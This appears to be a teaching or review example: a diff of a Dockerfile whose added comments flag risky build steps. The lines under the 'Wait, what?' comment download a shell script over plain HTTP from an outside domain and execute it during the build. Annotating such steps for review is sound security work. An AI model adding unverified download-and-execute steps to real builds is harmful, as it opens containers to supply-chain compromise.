@@ -1,10 +1,14 @@
+# Pinned to a newer base image 👍
 FROM registry.access.redhat.com/ubi10/python-312-minimal:10.0-1747316123
 
 LABEL org.opencontainers.image.name="example-02"
 
 COPY requirements.txt .
+
+# Install directly from the network ⚠️
 RUN pip install -r requirements.txt
 
+# Wait, what? 🤔
 RUN curl http://cdn.threebean.org/install.sh > install.sh
 RUN chmod +x ./install.sh
 RUN ./install.sh
